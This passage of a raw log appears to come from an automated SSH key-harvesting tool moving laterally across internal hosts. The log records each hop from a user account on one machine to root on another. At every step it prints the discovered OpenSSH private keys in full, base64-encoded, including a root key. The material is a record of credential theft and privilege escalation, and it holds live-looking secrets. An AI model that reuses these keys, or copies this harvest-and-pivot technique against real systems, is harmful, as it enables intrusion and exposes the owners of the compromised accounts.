pOUmlhNEhLZ2k3VnVuYWhRWU5vMStqL2Y1R1NUTWg0aVg1cDUzZGVWOApSNTRSL2kwZUN5WTd1VHJBRGJreVRtWnRIenJFbWxFeFEvaUpRdE1Ba2tFU3pFS3lRcG5hSXhzbnlTend6ZzFHbDBwMzZ1CkZmSk9mZm5kVXphZDJBWjR2K0lGVENMcFdrcEFPTDZJUTRPUWloNHRvaHIrT2laeWFLWWJKQnRJNmhld1JGbjgrUS9zQy8KdDVrQ09YdjJQUUdMNjNMUWFHVEUycVFPNi9VPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020313]jrogers@10.128.0.25: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020314] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020314] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020314] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020314] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020315] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: Discovered usable private key [3072 MD5:5f:15:03:e3:c6:5e:7d:db:2d:b6:ea:a1:56:91:a8:ee jrogers@instance-5 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020315] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEyLzVwbE1pVm4yaWVlaEVrUVFZSDBXTGo4anVpTTZiZmR3TDYzVEpucGdlU0dEcEZXYUxWCnJxdktSSjhZNEhRdTVJTXRHcFkvWG1XSVNOT2ZIOVpUcU1majZHdVRSK0dRcU01NzFSaTJ1RmJZY0t6SUhmK29PODNEWVUKeUVBdjZXSm1Xd3EwcndQcUxPUXpWRWRNQVVXRTVsNUpBalpSZFd5RXBaUkFqTlRubFZlbkc2QmVQZGgwZlZTRkxlMnVReApPSGdxOE9lRkdQL2gxS212REpocHo5YlZtc1ExM3dUSDN0ajh0RTVwK1RqRjFNMm52LzZhZlBLVlIrenBwZ1lUWkFnMVlLCmI3bDQ4UzhDYVpTMkZiRmJIL2FwRjZ3WHZYOENWbWlqTVJ6amQ1c0hvdi9tT29SM25WN0lIbVhBTWw5Sy9wWHRVY2FPQmwKYTJFZGpqblI3Z09CZFZBbXBvdEE0WG8yc3lnYnNHbVQzd29FOUJaSHVzSGZYL3VZemtmYlE5V1F1U1FDNnBkVXNwTG5IMApCM21pdS9sT0FIZ3ltZHg4VThXK1paQlpObW5PK3NFK0pTeGJwKzhET2YxT0w2ZXJLYUpuZGszVnZ6QlNhVmh0dTFwZnFrClYzUnoxUTFCS2ZqeWx6eDJodSs0VkRGUE1CRWpVTmk5bmI3eHE1T2pBQUFGa0t6aVd2MnM0bHI5QUFBQUIzTnphQzF5YzIKRUFBQUdCQU52K2FaVElsWjlvbm5vUkpFRUdCOUZpNC9JN29qT20zM2NDK3QweVo2WUhraGc2UlZtaTFhNnJ5a1NmR09CMApMdVNETFJxV1AxNWxpRWpUbngvV1U2akg0K2hyazBmaGtLak9lOVVZdHJoVzJIQ3N5QjMvcUR2TncyRk1oQUwrbGlabHNLCnRLOEQ2aXprTTFSSFRBRkZoT1plU1FJMlVYVnNoS1dVUUl6VTU1VlhweHVnWGozWWRIMVVoUzN0cmtNVGg0S3ZEbmhSai8KNGRTcHJ3eVlhYy9XMVpyRU5kOEV4OTdZL0xST2FmazR4ZFROcDcvK21uenlsVWZzNmFZR0UyUUlOV0NtKzVlUEV2QW1tVQp0aFd4V3gvMnFSZXNGNzEvQWxab296RWM0M2ViQjZMLzVqcUVkNTFleUI1bHdESmZTdjZWN1ZIR2pnWld0aEhZNDUwZTRECmdYVlFKcWFMUU9GNk5yTW9HN0Jwazk4S0JQUVdSN3JCMzEvN21NNUgyMFBWa0xra0F1cVhWTEtTNXg5QWQ1b3J2NVRnQjQKTXBuY2ZGUEZ2bVdRV1RacHp2ckJQaVVzVzZmdkF6bjlUaStucXltaVozWk4xYjh3VW1sWWJidGFYNnBGZDBjOVVOUVNuNAo4cGM4ZG9idnVGUXhUekFSSTFEWXZaMis4YXVUb3dBQUFBTUJBQUVBQUFHQkFOcEQyb0R4V2ZHa25NZERScEwwNXNESnVwCnJVcTZOUGh4ck83QktXTmR1Mld5NktjYy96RE1xV1NzSTJqem55UzZ3UXNhbFZORjMxb25lTzdxdHB1K3NURjMyN2JZNjkKcndhc2hwUHdSeWt4a09DSnJLcUd3bVZEU3Z1NExLbkQ2VGtEWDNzemlKUzhkcVNicnVXZXhSQ3dCOHZ6YmdxWVUxTzQ0RQpQdDc3UlNFWXJBVnU0TkcvZGlQNnZYL0o5MEU1bVJNQmwvdXNBSThBaE1xZzUzRVZSU00rK3ZpRHRTeFBMR21rSlNJalpRCks0ZHMyMmhUdFBjT3Z5bHpWb1dRTThuM2RsSmlKRVRhWmkrbU1JSi9NWUoxUXNuVEFKSjJBVFVseGJGQzVqOVlxTXNGT0YKRnA3cmYvOXZJeDJQYkhjaExxbWFFUDY0Zmx2VjhESmFaTmZ1cHVqNWxaR3RIYTk4dnRVK3JxSTQrWnVRUWlUNnI2WGluVApGZ2xYUXFQd2YzdjB6S2ZQTW5TUU53ekVKUG5QZmNCWWRsVU9ST3lEeXR2VG9Hb2hsNFRmMThJWlZpdFhHZTl6S3gvWGpSCkViNG9nb2RtNkVvb3lKbUNWUlFPSlg4NGlad0laNDc0WjhqTmxYYk5sdVZKQzNPV2VyNFJ1U0tmM1I5aTdZRWV3aFVRQUEKQU1FQXNUM2VpVmIvZk9HcGJ4VlJ4SEhGZGtMV2I3aWxmQTRGbnpSNkxFREhodGV2bVFlc3lLTkZJaUhmTEphQW1jN0ZqTwpKQUJkNUhUemFyWkpnUzB0TVNNY3M3bE14NGx6Q25oTVNiYnJBSDhSU0ZYVU8wK0hnUmsvMHJsV2ROMnN3OWpzL0NkN3RLClorTERLMTZKNE9DK1NDUUZpRWtTa2N2c1JabGNvWmFIcjdzNytzSWxidVpSNlZuL2MrNDloN3dmakhtRWZaMkxJV1gxYTQKL01ISlY2K3h2cnR1S1NhRld3cWJBdzBpSmZmZFR1NjFQTjI0aHhEYWdsM0JHR1Q3Ky9BQUFBd1FEdnAxUXBKTXVLSUUrRwpxMzRkRFhQQXRiYWNWQkFxTGJVSzRjTkx5cDV1ZGVGRm5hczdndWpzYkU0Zk5McXBEWExvNjQ1a2dwR3NuRG1IRGxaeGI3CmVwTlBZNEJZNmI0ZU05VGZxUTliNy9uUnJiWDk5Vm1YajJLQlBMMjluMFZ2SmhHWXowUnRJMklpS001T3h1WFFOVWFvcGcKRzNEVWZDOGVHSUhReWxOSGs0bC80Y0h2UUttbHY1aU1iREIrRVVhZUVUczd6ZnNONEc5ZTZFZnJOSlphait6TC92K0JJOApiNkJEdElZUm03cnYrMHpVOEJWZUdkQmd5MWZpQktxeWNBQUFEQkFPci96QUVTYlFEUXd5TGcrWTRnakRaaUVlejNVWE5kClpkNlZQa0NhUStJb2d1b0J5a0hIU2h1MXFuQ3diZFVkM3RsYWRkQ0xHN2VMYTYya2VIbHpBQ3A0TDlIVUlBS3ptSWVEa2EKT2lNTDdUV2pYMXpiaTNiMWJPR0xxWnM3eHNnWjd4bnNtQXBxTjhjeGtiaXU2S3hxbFc4U3FqcHBIS3VCZDh1ZXdhdzVDcAplUVltMWVsVlZKZTBMZEl3Y1VRSEJVWU1DSHdrY2NSSTQxRnFsbElNZ1BqNzYvWjYzelVWZ1VBL0pwRmp4S3pIdjV5Rzk1CndSZzFPWmlpZWoxV3JSSlFBQUFCSnFjbTluWlhKelFHbHVjM1JoYm1ObExUVUJBZ01FQlFZSAotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020315] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020316]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020316]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020316]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: Discovered usable private key [3072 MD5:a5:d8:9d:c3:32:08:3f:72:b8:57:05:f8:f7:69:63:46 jrogers@instance-7 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020316]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2ZUxNOFdvZkYzZXVaSVZiM3dNMEVTQktQaFNQYkRqNkZEUGdEc2tSUHNZc1g2SVg2b1dpCjc5dUtKL3B0ek1TZjBjRkFyaWxLK01WbjVLOE9ndENhK2UyWlkxUEwxZUQ2VzluRzhQcThYTUVybGtUekVNTjUwRUx3T1IKdmRMSW10SVpOelZKQTVLTjN6azNKY05xVEo2MHk2dnRReEV3VjcxVGVNTUdDTTAwaHBUYXZnR0ZmTnRDVjBRcWM3aWtwdApqd1ZFTWJJdGJiM2szZXpUakRVUEc4Ym5qbDd5cC9VNG1CaWFxTDdBUENjOVdWV0hTYUpEcHE3VXpJdTNwRWVWMFcrYlhVCnp3eFJ0bXRCNStxbnRUcjdOajlUaERZaTh0bVdqdnFISWY4QnNaMkpnLzNrQWRuT1JFSDFxRVZnejQ0RFNHWWxsSDdGK3kKbEtVa3VlbXFTdkFRQ0pET051d1JHaTFDb0lPRGtiR0pCSFhRbW12MXpYQkRtZmdFQ2kyOHFjQkU5UFRXeXN2L3lLUWJLeApycmZzVUQ2cUIrR3c5RUU3NW5udXdCMENEUzRuZld1ZEVTc2prVXZjcmZnd3BEN3lYOFhIQ0JKUmozK0NGbm5yYy9qN0c0CkZtR0lTVUt4ZmR3dlBMbmFKWUtVdnArYzhwTkcwK3l4VVVMcm1VT2ZBQUFGaUlHUVNVV0JrRWxGQUFBQUIzTnphQzF5YzIKRUFBQUdCQUwzaXpQRnFIeGQzcm1TRlc5OEROQkVnU2o0VWoydzQraFF6NEE3SkVUN0dMRitpRitxRm91L2JpaWY2YmN6RQpuOUhCUUs0cFN2akZaK1N2RG9MUW12bnRtV05UeTlYZytsdlp4dkQ2dkZ6Qks1WkU4eEREZWRCQzhEa2IzU3lKclNHVGMxClNRT1NqZDg1TnlYRGFreWV0TXVyN1VNUk1GZTlVM2pEQmdqTk5JYVUycjRCaFh6YlFsZEVLbk80cEtiWThGUkRHeUxXMjkKNU4zczA0dzFEeHZHNTQ1ZThxZjFPSmdZbXFpK3dEd25QVmxWaDBtaVE2YXUxTXlMdDZSSGxkRnZtMTFNOE1VYlpyUWVmcQpwN1U2K3pZL1U0UTJJdkxabG83Nmh5SC9BYkdkaVlQOTVBSFp6a1JCOWFoRllNK09BMGhtSlpSK3hmc3BTbEpMbnBxa3J3CkVBaVF6amJzRVJvdFFxQ0RnNUd4aVFSMTBKcHI5YzF3UTVuNEJBb3R2S25BUlBUMDFzckwvOGlrR3lzYTYzN0ZBK3FnZmgKc1BSQk8rWjU3c0FkQWcwdUozMXJuUkVySTVGTDNLMzRNS1ErOGwvRnh3Z1NVWTkvZ2haNTYzUDQreHVCWmhpRWxDc1gzYwpMenk1MmlXQ2xMNmZuUEtUUnRQc3NWRkM2NWxEbndBQUFBTUJBQUVBQUFHQWVyUksxMTVLUlRIem9jV0R2ck1sUEVQdmRmCnAzUytudHdJeGRKM0RMRWhPaHJSTGovWXJwNWJHcXIzYm02VUhPUFE5eXFwaklkOFdwQTJBVU1uaDNEVFo2dm5MeDczMzQKaXM1Si9vTW9vWSs2aU5wNWI4WEJ1OURseHlHNFpRVjZ1WTI5STFJbmZiOGZuWkp6QUdTd2pyc0Ftandva2pBaSszOXZ1Zgp0S1JXWXZsaCtSS21uaTVaeW1ha1FDOTdSczQ5VDFZbC9QZDNFVXFreFZ6KzZobXNPSDhycHNlQmpBdjVoMnFNRExISlFHCjB1bXdDT2N3YkUvaDkyUDZBZEMzWkthQ2ZJV3piaHFHM2ZpY3dpMU5DYm1ZR2tER0plenNkRFZDUmwxajNxQkV5UnJHdE8KbWpRRytUb3p2Vi9GK1hxNnUzVkltQTFLaEYreHZBMk1WSGowQ3RITFdTQTBNN2RrbGYrdEUvUDZRWEl2OG5UQktHUzErQQpONlcwS1B6RWhaQk9SVlYwb0dLOU15NkVSbGxENGNqenZoTVhDRDg1blY4NEY0ZGMvb251RGFKNGVsb05ONkZ1aWRsUlhLClR4dzhXTVVYRjE3MGVpRlJ3bi9qVnY3bjNsYVptUUlQSnVBYXliMUF0ZkdjZzczT3VJd2IwbXBUeld5blcwSzBEaEFBQUEKd1FDaHcwZXMvRkdrUndsbEFYTmlPd201eHNnQWhLQUFkcHRYU3VLWWRvQlNQYklleVBGNnQ3VlVzclI0MmlmMHF0NDdmTApzMVVFeU1qRnNQcEVRMEFTbHlPUEk0U1h3NHlWaUhaTVluZ2pWOExIZ3FkOXY3a2o4cEJlNXMvNCtiZnpCUVpWbDJHQkNvCk5zdVI0cVZlMGZDbGlQd3pjMDcwOERGdnJoa2dNQXpPSWYwOWptdzkxd2dESmxuUWN1REVtZGdVSjBZY3NWMXZ2emp4NDcKbThWcFlhQzN3clBlc3FqMWdjK2RjdWJKSjlqN01ycmxnZlZsclliMTFTTi9weFAxTUFBQURCQU9CekJnWmhva0kyRzRGcwpGUXhjaVFOZUlERkFkZTJEMDdTTzRidG5vVEJSRmhKZ2VNVUFyQ2RkZGQ0NzFpZ0FSMWtCdU8rb3Nid2lXeEZtbCtPMEF3CmN5TlNtaWZGaGlMWG1VVmpnNytPdHRlSmFlaVE4OWtQT0FYQlErSzUyWXB0TERuM05IYmN6NHQ4SjRiUG4zRVkzeUZFcnQKYUVxb29HWExyNVBxRkNqQU0zemIwcVdqZmNTT3JFTjRKK0Z3cCt6blZXZU90MHoyMzJ4T2dmTDhKNUk1anZqSTlFUEU0Vgp6UDdNbUNTRklaWDNwMm9ZWTgxeEkwRyt2cWpwUXNHUUFBQU1FQTJKUDgvWmxmK0ZYbldKQ3FiUWtlbXlBa3UycE5UT1pWCnF2U3ZaZ3lTdUtmRW9pZ29zRlRCbzBITURKVEEzb3pSOVF5blJHR1BXRHprQXRwZit3N3RrQ3ZrdWtob2VOZ3FjSldBSGwKVE51dUlEQTlZaEVSYVFHTTRSVlhQQUZWWlhzOStTVzgxS2ZYWGQxQktQcnpDNXVqS1JrbFhheUsrbWE1VWl0TVpZMUhFKwpFSzBKbjM4enZiQ1BqbUYrNkE2Zm1GZkdLby9NdDVjYXFFc3U2NWVjQ05qTFhPRTlOdEJ0cm9yWGo1S0RoRWFQb1VkZ3JkCmNoSDI1L1gyVGZWMlIzQUFBQUVtcHliMmRsY25OQWFXNXpkR0Z1WTJVdE53PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020317]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: Discovered usable private key [3072 MD5:88:56:95:eb:90:b5:8a:1c:00:65:3f:da:75:9c:1d:71 root@instance-7 (RSA)] in [/root/.ssh/id_rsa]\n[1704020317]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2bUlXTjZjc3c4RzhDQXFHcmhiUmhJbEF1YzRSQUQrbFRRUUR5aWVPazB4eUY3c3pNR1c4ClFpU3RTU1BqaW1wKzhub1ZmL3RuUG4wTWp5MEJtSCtyU3kyYThKeDZCSzE0cG0vT2MxbUtWNEFwRmpvZ1BFNDBXbmNtL3EKTjU3UzM1eUNxQ3o3Vkw0Y0xOMHNqN3N3ME9KR3p5NlNxVW9zckY5QnVxL0t4bjRCeUlzRGErRm0vSVdpRDZiczczTGhMRAp4UFpXNDd0N2xmYWczNTNCTWNBTXJ4U0pkM2lxS3UwamNYa29vdUwzUzNUSlNJUHBneDBnelBaSkNhSDVBOTd0Z1dIbERDClp6ZVlFNFdGVU9KQ0VzcXlwVnRRSDZkN2ZWcGgxaHVCd1Z5VzRTVXpxUStSNjVHWWRFYmFVdks5V1dueHlUc0ZMcERYMGEKcjNmbTUzUkpqRm5pM1h3eW8zUS85ODhxT2Z3cUVLODJDKzE0a0Z2UGdYUE5CQTJZQzhJdndVR1RSUFlrRkhVdnlvQmdpbApISzJRa1ZCUFA4SnVaZ01kNWFXcmFWV2lWdHBmempvMWhMa3NCT0lwemx5cXJmQVBnZVJINmRSeExEdEtLTU5JZVFTWnRECi9XbDFueDg0bFJtQnBuS29RVEtidnQ0dnNpMGpFQ0NrV1BzcTFkejNBQUFGaUNoOTViTW9mZVd6QUFBQUIzTnphQzF5YzIKRUFBQUdCQUw1aUZqZW5MTVBCdkFnS2hxNFcwWVNKUUxuT0VRQS9wVTBFQThvbmpwTk1jaGU3TXpCbHZFSWtyVWtqNDRwcQpmdko2RlgvN1p6NTlESTh0QVpoL3Ewc3RtdkNjZWdTdGVLWnZ6bk5aaWxlQUtSWTZJRHhPTkZwM0p2NmplZTB0K2NncWdzCisxUytIQ3pkTEkrN01ORGlSczh1a3FsS0xLeGZRYnF2eXNaK0FjaUxBMnZoWnZ5Rm9nK203Tzl5NFN3OFQyVnVPN2U1WDIKb04rZHdUSEFESzhVaVhkNHFpcnRJM0Y1S0tMaTkwdDB5VWlENllNZElNejJTUW1oK1FQZTdZRmg1UXdtYzNtQk9GaFZEaQpRaExLc3FWYlVCK25lMzFhWWRZYmdjRmNsdUVsTTZrUGtldVJtSFJHMmxMeXZWbHA4Y2s3QlM2UTE5R3E5MzV1ZDBTWXhaCjR0MThNcU4wUC9mUEtqbjhLaEN2Tmd2dGVKQmJ6NEZ6elFRTm1BdkNMOEZCazBUMkpCUjFMOHFBWUlwUnl0a0pGUVR6L0MKYm1ZREhlV2xxMmxWb2xiYVg4NDZOWVM1TEFUaUtjNWNxcTN3RDRIa1IrblVjU3c3U2lqRFNIa0VtYlEvMXBkWjhmT0pVWgpnYVp5cUVFeW03N2VMN0l0SXhBZ3BGajdLdFhjOXdBQUFBTUJBQUVBQUFHQkFLak1tUHhSS2h5SzJtZWF4WnozT0Y4MXZvCkMvbDAxTUlRanZCVmtveDM0TWFxQmw1MVlDN2U4TFMrVXNmK1BLMXJHdzB2MDliMlgxUTd4eVlCYlJJNVF0WkZIdnV6UUkKaG8relZDM3I5di9yN3dINUdYbStzU2FBdkw5TFBLQ3hnZVVhNUE2N3BRTVBVS1NTZExCbFkrT2lBYUlBa2ZiZ3FMRHVFeQpXaXl4cm0wYjdEV3JqVDlhVUwxbCtHKzV3TElTNnlaNG5WUWhkTnE0ZDQvTUZha1NSdXBnK2FtZTRqZ2Focmp6OFUwOFJBClVQTU5tbTRZMW10RDlyQW12MzNTR2VUbTV1Skozdm9Ya3plVHVqUW9NYkh3SHg1TVpqQkJwcW9VR3ZLL3RUUjdjT3VYMzIKd1VwdXQzTFNvZWNMV1ZhN21pTkFHY1JUcnB2aEhYTXhPMExXVHdYa0h2Q0VTemVlSUlTOVBaaDQ1bUY2Wms5ZThhZzVlNQpHSXgzZFljSFZEaW81d1VSam12M21RWDRrVHBoOGQ5WVhzZS9sdHhsZlFWVDY5bW9MYmszUDZJR01OQU9aMWhRb2FmVlN1CllNdGE4V1JQY2d1RkFlT3dtUGFTOXc0VGVLSXpjTG12VHJDZDY2dU5rTXRNWjZORWloOXBTZ2lEMUJDU3Z5T0R6MTZRQUEKQU1FQXZLcnVUY0FlenFPUjNZMXhHZTBiR29xRFU4QUhUTjBtYWVMa1RSaHZqalc0MElndXkvQ2hleTRSNnd0a1FQN3pSSQoyQzAyemJMTkh3cU5lOGJDRjdFNWVyRFJuZStsaHB1bm9CQUxnZ3Yya0ZvNnhhanVpcW1VVlJTaHVjSlR1bnhmK251b21jCnVsQ2VNL0dOZUlLbkFwdEdFL3MvaU5RN3ZUdnA3NW9BemNRWVo3NVJETWt5OUlxZ1NQb1pLd3dsbFpHYkd0K21TaS9UUi8KZHVuZkVrcGs3TVpRU3h2c0RTSjFJbnpZOHFxMUtQV1BtbW03czNZbS9Id1NxUUxicUdBQUFBd1FEcFdCZUJ2WTZtYVovOQpycXZ3Y1RNakxqSnJBZEZWR2ZQWmtBQy9BVDJwOTBBNEZJZTNCcDhGU1dWTFU2cG1aNzdrSjVJSUZCdGxXZjJnNmNFcmExCjYrYVREaUt5N1NsZWxNNTdaQVFyS1BPUEtDcHdTcXZGcTVaNjEwcjhzWkg5STE1c29BYkhQM1hLb0pPS09WUTFtVDZ5bXEKOTQzZUg2QU9KZGxsNlI2Qldwc2o3aFUvbURvMW03YmZWdkd4R2xIU1ZmdTArZUtEUTBsczU5YW5BQnEzbWFBbTNYQmUrTwowMy9xMTQ0UUxkR2grbFlwV2hsOHRrbG51Vll1QjhhVjBBQUFEQkFORGVMSzRmaG03d3JiUUtoNTJGMy9YSzR2eU5HSVRBCjdmQVZ3R3dscVF3clBFQm9mLzIycHlnaUFlWGFOK2ZNRG5ZdU56TTRoOGNZakgyK2grRkVGL3JKV2c1M2RCVU5QUnFLK28KNEJINGlnaTNZQ3pXSnlWYTVJemtPakxCWURLbVBsbm5MK09GU0NtaVYxUXM5MlRPMG0vRk4xcXVra0cvSVMwdEM4MlV0SwpqbkdYR2NCNjBWd002Um15ZlA3ZldSWUlSWFRGNTYrT0l2VFg5SUt0Zlk5ME52MnJpTU1GR0I5VzA3aUhyVU5iYzdHNmNwCndFalFUcnJVQlVyUVcyWXdBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRjQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020317]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29: EXTERNAL_MSG: INFO: Beginning with 12 dests and 2 keys\n[1704020317]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020317]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020318]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: Discovered usable private key [3072 MD5:b2:45:a5:03:54:c7:71:29:c1:0d:f5:c5:e8:27:63:5f jrogers@instance-3 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020318]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFua1JURStqRURCZU5sM25WRVIyTk9udUU4ZUIzSHdxeDhCMWphamdDZmk3NERIZlYvc3hZCnlkNjBybTRYbHFzWk8weFM3YW5vVTM5RmFhZ1llL2R6RG1ZWDY3Y0V0V0hsVUJQVGh0OEhYUjFUMlBYaGZLZTBsUHA3Sk8KS0ZFTjFqMmRYaEhsd0g2dlhMc1RwS3lUdzBYR2FoRmhoNHl1VWlkTi9RRlQ2aDgwRlArZ1c0N1J4U1hGTUlQRE9McWJrSwpVNU0zRER4ZUlaaDgzT0UzcDlRSHBzS2VIamZaNWYzaDBtbFFLY05vOGE3eHI1OVRCcGFhMkwxc05KbXZNTzNVb3QzeG9VCnRnU0dLNldValNOQjcxeldNN1lyUFIwd3JzSHBObGpFUkdIV05DR1lTU0NtVUdNclhOUjk2N1VKYjZ3Yk9KUitEUk1vUzcKUEY2VHdXek5VY2lIcXN3a1FMZUFGM1FObWFKWXBHUXFLbkVoN0ZMRkExdklEWjVSeWhoTnZGSkVoMUt2bWxQMzVJS3l6ZgppTkdXRjZHTCsrYVVtUlJpY2xuU3AyMTcxaTB5djJicm92L0tOMmlXYXEvQStOZjBGaFlYZDJ4RzlCK1RFbHFOT0xyRnRtClc3ZVkySFFtWlBPb3VRQlJ4Zms0Nm96QzczMTJJOHhjQUFFdnpFMnZBQUFGaUd3cTRxTnNLdUtqQUFBQUIzTnphQzF5YzIKRUFBQUdCQUo1RVV4UG94QXdYalpkNTFSRWRqVHA3aFBIZ2R4OEtzZkFkWTJvNEFuNHUrQXgzMWY3TVdNbmV0SzV1RjVhcgpHVHRNVXUycDZGTi9SV21vR0h2M2N3NW1GK3UzQkxWaDVWQVQwNGJmQjEwZFU5ajE0WHludEpUNmV5VGloUkRkWTluVjRSCjVjQityMXk3RTZTc2s4TkZ4bW9SWVllTXJsSW5UZjBCVStvZk5CVC9vRnVPMGNVbHhUQ0R3emk2bTVDbE9UTnd3OFhpR1kKZk56aE42ZlVCNmJDbmg0MzJlWDk0ZEpwVUNuRGFQR3U4YStmVXdhV210aTliRFNacnpEdDFLTGQ4YUZMWUVoaXVsbEkwagpRZTljMWpPMkt6MGRNSzdCNlRaWXhFUmgxalFobUVrZ3BsQmpLMXpVZmV1MUNXK3NHemlVZmcwVEtFdXp4ZWs4RnN6VkhJCmg2ck1KRUMzZ0JkMERabWlXS1JrS2lweElleFN4UU5ieUEyZVVjb1lUYnhTUklkU3I1cFQ5K1NDc3MzNGpSbGhlaGkvdm0KbEprVVluSlowcWR0ZTlZdE1yOW02NkwveWpkb2xtcXZ3UGpYOUJZV0YzZHNSdlFma3hKYWpUaTZ4YlpsdTNtTmgwSm1UegpxTGtBVWNYNU9PcU13dTk5ZGlQTVhBQUJMOHhOcndBQUFBTUJBQUVBQUFHQWRTRHZzdzVTK1BmOWJCdFlXb0JhWXV2REtoCmNMVWNmaWhHZmJpV0xHUllpUlB2ajVRTWNPOXVlQkpJNkptcElwN0Q3Q0tPM1Q2T2VLQVhYTUdRSzYvZThFeVFmN3poa1QKVXI0NWo5bERZK0F1aTZUOUtmb2JwUjN6UVFyN204MmM5anhaak5SamI3cFU4MmJHcmtPR0pOUTNaMWpaSEorVGJwZXRNZQp2V2cyYlV2NTY0aTVLb1NYZVI0cXZyTXNLbEo5RU5ybHFHOTZvWXpvZEhYMGVHR2g1eVVyN1czbVdVV05wajMyU2xLQ2htCjZhaXFFM2dtUlQxNjlUcS84eUF2VWdUcDRGUjFZU09WY1V1RHVHSjF5aWc4cUFmUVdIMnN6THhRa1R4dkhXTjlOTU9zczkKKzloSmJjZjRDN0p3VXRaQTUwQVBXdnpWZnVyakh0VEVBQ1ZNOE83MDZ3NFlkY2pSNzVhbk5tamlINXRhSWhKU0w5YStBYwoxOXBJUmJEUzRCRldHS2wwSk1LU3NwdjF3eXVmZDZ4cGhlZE12cnNieE1OeFVBdU9vTzBXRXVXRDFDT29QbEx0M09IUGVFClpwWTRnUFpwQkFwakR4QmZ6cS9QdWtGOC84QWt5eXdSY1pEUU4yVGtWdjdkWmlKS2s2Y1EwWjA5YVoxSEpONGlVUkFBQUEKd0hOdEx5eUU0aEJUZk5ZS2EyNldyay92cWQ1UlZiMktvZm9wT2lrV1R5Y25vOUp0L1llN0FRWGc4Yks3UzBNeVpCbzdkSApVMnRDL1B5Tzl5NjQyMEZoYVg0NURLZnlYckRBNk44UU1WVmtHd25zaWFDUERKUkhVUUwvVTRjZ1pUOVB2SUI5enVNMUM4CkVObzhYMmhBalVYa1ljWmdTYUM4Y2F1TjhWSk4wMFVBa0xxbHE3TTdKYmhHS